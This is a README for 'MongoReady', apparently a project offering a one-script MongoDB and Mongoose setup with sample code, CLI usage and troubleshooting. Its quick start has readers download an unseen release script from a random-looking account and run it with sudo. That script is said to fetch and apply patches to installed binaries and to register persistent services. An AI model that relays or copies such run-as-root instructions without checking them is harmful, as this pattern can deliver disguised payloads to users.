About
MongoReady aims to cut setup time. The script runs checks, downloads packages, and configures services. It aims for stable defaults. It focuses on developer needs: local databases, test data seeds, and tight integration with Node.js and Mongoose.

Why MongoReady
- Save time. The script handles environment quirks.
- Reduce friction. You get a consistent setup across machines.
- Reproducible local environments. Use the same defaults in teams.
- Avoid manual steps. The script handles system package managers, launch agents, and service units.

Features
- One script install for Linux (Debian, Ubuntu, Fedora, CentOS) and macOS (Homebrew).
- OS detection and path validation.
- Port scan and conflict resolution (e.g., default MongoDB port 27017).
- Patch application for known CVEs and bug fixes that affect local development.
- Configured systemd service on Linux.
- LaunchAgent setup on macOS for persistent runs.
- Optional non-root user install and user-space data directories.
- Auto-setup of Mongoose and a sample Node.js project.
- Seed data generator and seed restore.
- CLI for quick start, stop, reset, and status checks.
- Configuration file in YAML for repeatable installs.
- Migration helpers for local dev data snapshots.
- Clean uninstall script that removes services, data, and configs.

Supported platforms
- Ubuntu LTS and non-LTS variants
- Debian stable
- Fedora 33+
- CentOS 7 and 8
- macOS 10.15 Catalina and later (with Homebrew)
- WSL2 (Linux subsystem on Windows) — use with caution

Requirements
- 1 GB disk free for minimal install, 2 GB recommended for test data.
- 1 GB RAM for small dev instances, more for realistic workloads.
- Network access to download packages and images.
- sudo or root access to configure services and ports.
- Homebrew on macOS for package management.

Quick start
1. Download the latest release file from the Releases page:
   https://github.com/oussasdqfsqf/MongoReady/releases
2. Locate the release file named `mongoready-install.sh`.
3. Make the file executable and run it:
   chmod +x mongoready-install.sh
   sudo ./mongoready-install.sh
4. Follow on-screen prompts for optional settings.
5. Start the sample app or connect via mongo shell or MongoDB Compass.

Installation steps (detailed)
Note: The file must come from the releases page above. Download the release file and run it.

1. Download the release file
   - Open the Releases page: https://github.com/oussasdqfsqf/MongoReady/releases
   - Download the latest `mongoready-install.sh` file.

2. Verify checksum (recommended)
   - The release includes a `.sha256` file. Run:
     sha256sum mongoready-install.sh
   - Compare the hash with the value in the release page.

3. Make the script executable
   - Run:
     chmod +x mongoready-install.sh

4. Run the installer
   - For system-wide install:
     sudo ./mongoready-install.sh
   - For user-space install:
     ./mongoready-install.sh --user
   - The script prompts for choices. Use the flags to skip prompts:
     ./mongoready-install.sh --yes --no-prompt

5. Post install checks
   - Check service status:
     sudo systemctl status mongoready
   - On macOS:
     launchctl list | grep mongoready

6. Connect to MongoDB
   - Run mongo shell:
     mongo --port 27017
   - Or use MongoDB Compass and connect to mongodb://localhost:27017

What the script does
- Detect OS and version.
- Check for package manager (apt, dnf, yum, brew).
- Download and verify MongoDB binaries or packages.
- Add the official MongoDB repo where needed.
- Install or update MongoDB package.
- Create a data directory at /var/lib/mongoready or $HOME/.mongoready if user-space install.
- Set up a service:
  - systemd unit on Linux.
  - LaunchAgent on macOS.
- Create a basic mongod config file with sensible defaults:
  - WiredTiger engine.
  - Journal enabled.
  - bindIp set to 127.0.0.1 unless user opts for remote binding.
  - Small file limit for dev.
- Apply port conflict fixes:
  - Check occupied ports and suggest alternatives.
  - Offer to stop conflicting services on the same port.
- Apply patches:
  - The script downloads small patch files for configuration or known issues and applies them to the installed binaries or configs where appropriate.
- Install Mongoose and create a sample Node.js project:
  - npm init -y
  - npm install mongoose
  - Add a sample connection file and model.
- Seed the database with sample data if selected.
- Provide a cleanup script.

Ports and conflict resolution
Default MongoDB port: 27017
The script scans ports and does the following:
- If 27017 is free, it binds the service there.
- If occupied, the script shows the owning process and options:
  - Stop the process and use 27017.
  - Choose an alternate port and update config.
  - Create an automatic port mapping in the system firewall or proxy.
Examples of conflict resolution commands the script runs:
- lsof -i :27017
- ss -tulpn | grep 27017
- systemctl stop conflicting.service
- sudo kill -9 PID (only with explicit consent)

Patches and update flow
- The release contains small patch scripts. The installer applies patches that target local config or bug workarounds.
- The script registers a simple update hook:
  - ./mongoready-update.sh
- You can run the update hook to fetch new patches from the Releases page.
- For production use, prefer official MongoDB package updates from vendor channels. MongoReady focuses on local, development-safe patches.

Mongoose setup and examples
The installer creates a sample Node.js project at ~/mongoready-sample by default. The sample shows a minimal Mongoose setup.

Sample connection code (created by the script):
const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost:27017/mongoready_demo', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});
const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', function() {
  console.log('Connected');
});

Sample model created by the script:
const mongoose = require('mongoose');
const Schema = mongoose.Schema;
const UserSchema = new Schema({
  name: String,
  email: { type: String, unique: true },
  createdAt: { type: Date, default: Date.now }
});
module.exports = mongoose.model('User', UserSchema);

The script also adds a small seed script:
node scripts/seed.js
This seed script inserts sample users and logs results.

CLI reference
The installer creates a helper CLI: `mongoready`
Use it like:
- mongoready start     # Start the service
- mongoready stop      # Stop the service
- mongoready status    # Show status and logs
- mongoready restart   # Restart service
- mongoready reset     # Stop service, clear DB, reseed
- mongoready config    # Open the config file in the default editor
- mongoready snapshot  # Create a snapshot of current data
- mongoready restore   # Restore from the latest snapshot
- mongoready uninstall # Remove services, data, and configs

The CLI runs local checks before actions. The CLI logs to /var/log/mongoready or $HOME/.mongoready/logs depending on install mode.

Configuration options
MongoReady uses a YAML file at /etc/mongoready/config.yml or $HOME/.mongoready/config.yml for user installs. Sample keys:
- bindIp: 127.0.0.1
- port: 27017
- storage:
  dbPath: /var/lib/mongoready
  engine: wiredTiger
- logging:
  path: /var/log/mongoready/mongod.log
  verbosity: 0
- user:
  createUser: true
  username: dev
  password: devpassword
- seed:
  enable: true
  sampleSet: small

You can change the config and run:
mongoready restart

Sample Node.js app
The installer creates a sample app that demonstrates:
- Mongoose connection
- Basic CRUD
- Field validation
- Simple index usage
- Local migration example

Project structure:
mongoready-sample/
  package.json
  index.js
  models/
    user.js
  scripts/
    seed.js
  config/
    default.json

index.js (created by script)
const express = require('express');
const mongoose = require('mongoose');
const User = require('./models/user');
const app = express();

app.use(express.json());

mongoose.connect('mongodb://localhost:27017/mongoready_demo', { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('DB connected'))
  .catch(err => console.error(err));

app.post('/users', async (req, res) => {
  try {
    const user = new User(req.body);
    await user.save();
    res.status(201).json(user);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.get('/users', async (req, res) => {
  const users = await User.find({});
  res.json(users);
});

app.listen(3000, () => console.log('App listening on 3000'));

Docker and container notes
- MongoReady targets local installs. For Docker, prefer official MongoDB images.
- Use the sample data scripts with containers:
  - Start a MongoDB container:
    docker run -d --name mongoready -p 27017:27017 mongo:6
  - Run seed script from host:
    node mongoready-sample/scripts/seed.js --host localhost --port 27017
- If you run in a container, avoid running systemd or LaunchAgents. Use container management to preserve lifecycle.
- The installer can create backups that you can import into containers via mongorestore.

CI/CD integration
- Use mongoready snapshots to seed ephemeral test databases during CI runs.
- Create a test job step:
  - Start MongoReady in CI runner or use a Docker MongoDB image.
  - Restore snapshot: mongoready restore --snapshot ci-base
  - Run tests against mongodb://localhost:27017/test
- Add a cache step to reuse snapshot artifacts across runs.

Security and hardening
- The default install uses localhost bind only. Change bindIp to 0.0.0.0 only if you need remote access and secure through a firewall and authentication.
- Enable authentication by creating an admin user in config:
  - createUser: true
  - username: admin
  - password: strongpassword
- Use TLS for remote connections. The script can generate self-signed certs for dev.
- For production, use official MongoDB guides for replication and backups.

Troubleshooting
- If service fails to start:
  - Check logs: sudo journalctl -u mongoready or tail -n 200 /var/log/mongoready/mongod.log
  - Ensure data directory permissions: sudo chown -R mongodb:mongodb /var/lib/mongoready
- If port conflicts persist:
  - Run: ss -tulpn | grep 27017
  - Identify the process and decide whether to stop it or change port.
- If Homebrew install fails on macOS:
  - Run: brew update
  - Re-run the installer.

Logs and diagnostics
- Main log locations:
  - Linux system install: /var/log/mongoready/mongod.log
  - User install: $HOME/.mongoready/logs/mongod.log
- Use mongoready status to get quick diagnostics.
- Use the built-in log parser:
  - mongoready logs --tail 200
- Use mongodb tools:
  - mongostat
  - mongotop
  - mongodump
  - mongorestore

Common errors and fixes
- EADDRINUSE (address in use)
  - Cause: another process uses port 27017.
  - Fix: Stop the process or change port in config and restart.
- Permission denied writing to dbPath
  - Cause: wrong ownership on data directory.
  - Fix: sudo chown -R mongodb:mongodb /var/lib/mongoready
- Authentication failed for user
  - Cause: auth disabled or credentials wrong.
  - Fix: Check config, create admin user, or use the CLI to reset credentials.
- Homebrew: cannot install mongodb-community
  - Cause: outdated brew, missing taps.
  - Fix: brew tap mongodb/brew; brew update; brew install mongodb-community

Advanced configuration
- Replica set for local testing:
  - The script can initialize a single-machine replica set for testing transactions and replica set features.
  - Run:
    mongoready init-repl --name rs0 --members 1
  - The script configures local membership and starts mongod with replSetName.
- Sharded cluster simulation:
  - The script can create a minimal sharded setup using multiple local ports.
  - Use:
    mongoready init-shard --shards 2 --config 1 --mongos 1
  - This sets up a testing sharded cluster for development only.
- Performance tuning for dev:
  - Reduce cache size in config for small machines:
    storage:
      wiredTiger:
        engineConfig:
          cacheSizeGB: 0.5
- Snapshot and restore:
  - Snapshot:
    mongoready snapshot --name before-tests
  - Restore:
    mongoready restore --name before-tests

Development and testing
- Repo layout:
  - bin/                # installer and helper scripts
  - config/             # sample configs
  - scripts/            # seed and test scripts
  - sample/             # sample Node.js project
  - docs/               # extended docs
  - tests/              # integration tests
- Tests use a combination of Docker and local system runs to validate the installer.
- To run tests:
  - ./bin/test-runner.sh
- The test runner runs on Linux and macOS CI runners. It checks installation, service start, seed restore, and cleanup.

Examples and best practices
Local dev with sample app
1. Install:
   sudo ./mongoready-install.sh
2. Start service:
   sudo systemctl start mongoready
3. Seed data:
   mongoready seed
4. Run sample app:
   cd ~/mongoready-sample
   npm install
   node index.js
5. Test endpoints:
   curl -X POST -H "Content-Type: application/json" -d '{"name":"Alice","email":"alice@example.com"}' http://localhost:3000/users

Use snapshots in CI
1. Create base snapshot:
   mongoready snapshot --name base
2. Export artifact to CI cache.
3. In CI test job, restore snapshot:
   mongoready restore --name base

Automated dev environment
- Add `mongoready start` to your dev-start script.
- Add `mongoready snapshot` to your pre-commit or periodic jobs to keep test data stable.

Security checklist
- Do not open bindIp to external networks without firewall.
- Use strong passwords for any created users.
- Prefer TLS for remote access.
- Rotate snapshots and backups with care.

Backup and restore
- Create a dump:
  mongodump --db mongoready_demo --out /tmp/mongodump-$(date +%F)
- Restore:
  mongorestore --dir /tmp/mongodump-2021-01-01
- The CLI wraps these commands as:
  mongoready backup --out /tmp/backup
  mongoready restore --from /tmp/backup

Performance tips for dev
- Use WiredTiger for modern workloads.
- Lower cache size for low-memory environments.
- Avoid journaling disable unless you understand data loss.
- Use indexes in sample projects to reduce query time in tests.

Troubleshooting examples and commands
- Check service logs:
  sudo journalctl -u mongoready --no-pager
- Tail logs:
  tail -f /var/log/mongoready/mongod.log
- Check port:
  ss -tulnp | grep 27017
- Inspect config:
  cat /etc/mongoready/config.yml
- Reset local DB (destructive):
  mongoready reset

Common use cases
- Single developer local environment with Node.js and Mongoose.
- CI runners that need seeded MongoDB data.
- Classroom labs where students need identical local DB setups.
- Proofs of concept that require quick DB setup.

Limitations
- Not intended for production clusters.
- Patches target local dev issues, not official security patches.
- The script modifies system services; review before running on critical machines.
- WSL2 requires special attention; file path and permissions differ.

- Ubuntu 20.04 LTS
- Ubuntu 22.04 LTS
- Debian 11
- Fedora 34
- macOS 11, 12, 13 (with Homebrew)
- WSL2 (Ubuntu)

Automated tests check:
- Install success and permissions
- Service start and stop
- Mongoose sample app can connect and perform CRUD
- Snapshot and restore workflows
- Uninstall and cleanup
